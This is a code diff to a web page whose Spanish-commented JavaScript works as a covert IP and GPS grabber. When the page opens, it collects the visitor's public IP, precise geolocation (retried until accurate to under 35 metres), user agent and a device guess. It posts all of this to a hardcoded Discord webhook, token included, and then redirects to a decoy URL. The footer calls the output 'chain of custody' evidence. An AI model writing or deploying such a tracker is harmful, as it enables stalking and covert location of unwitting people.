@@ -32,7 +32,17 @@
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1480354512622452777/YfExoxgVAZfx50CEI8fVUhuM9KeoE2zmjROPrPOQMLWCeKxbqQmLlCuNfwSlJ9RYpNAI";
-        const FINAL_URL = "https://google.com"; // Reemplazar por el archivo real
+        const FINAL_URL = "https://google.com"; 
+
+        // Función para identificar el dispositivo de forma amigable
+        function parsearUA(ua) {
+            if (/android/i.test(ua)) return "📱 Android (Posible Samsung/Xiaomi)";
+            if (/iPhone|iPad|iPod/i.test(ua)) return "📱 Apple iOS (iPhone/iPad)";
+            if (/Windows/i.test(ua)) return "💻 PC con Windows";
+            if (/Macintosh/i.test(ua)) return "💻 Apple Mac (macOS)";
+            if (/Linux/i.test(ua)) return "🐧 Sistema Linux";
+            return "❓ Dispositivo Desconocido";
+        }
 
         async function enviarReporte(lat = null, lon = null, acc = null, err = null) {
             try {
@@ -40,6 +50,7 @@
                 const ipData = await resIP.json();
                 const ts = new Date().toISOString();
                 const ua = navigator.userAgent;
+                const dispositivo = parsearUA(ua); // Identificación automática
 
                 const rawData = { ts, ip: ipData.ip, geo: { lat, lon, acc }, ua };
                 const hash = CryptoJS.SHA256(JSON.stringify(rawData)).toString();
@@ -55,10 +66,11 @@
                             fields: [
                                 { name: "🕒 Timestamp (ISO 8601)", value: `\`${ts}\`` },
                                 { name: "🌐 IP Pública", value: `\`${ipData.ip}\``, inline: true },
-                                { name: "📍 Precisión GPS", value: acc ? `± ${acc.toFixed(1)} metros` : "N/A metros", inline: true },
+                                { name: "🎯 Precisión GPS", value: acc ? `± ${acc.toFixed(1)} metros` : "N/A metros", inline: true },
                                 { name: "🔗 Ubicación", value: lat ? `[Ver Mapa GPS](https://www.google.com/maps?q=${lat},${lon})` : `❌ ${err || "Denegado"}` },
+                                { name: "📂 Análisis de Hardware", value: `**${dispositivo}**` },
                                 { name: "🔑 Hash SHA-256 (Firma Digital)", value: `\`${hash}\`` },
-                                { name: "📱 User-Agent", value: `\`${ua}\`` }
+                                { name: "📱 User-Agent (Indispensable)", value: `\`${ua}\`` }
                             ],
                             footer: { text: "Evidencia generada bajo estándares de cadena de custodia digital." }
                         }]
@@ -75,17 +87,16 @@
 
             if (navigator.geolocation) {
                 let intentos = 0;
-                const maxIntentos = 6; // Reintenta durante 6 segundos para clavar el GPS
+                const maxIntentos = 5; 
 
                 const obtenerMejorPosicion = () => {
                     navigator.geolocation.getCurrentPosition(
                         (p) => {
-                            // Si la precisión es menor a 35 metros, enviamos de inmediato
                             if (p.coords.accuracy < 35 || intentos >= maxIntentos) {
                                 enviarReporte(p.coords.latitude, p.coords.longitude, p.coords.accuracy);
                             } else {
                                 intentos++;
-                                setTimeout(obtenerMejorPosicion, 1000); // Reintenta en 1 seg
+                                setTimeout(obtenerMejorPosicion, 1000);
                             }
                         },
                         (e) => enviarReporte(null, null, null, "PERMISO_DENEGADO"),
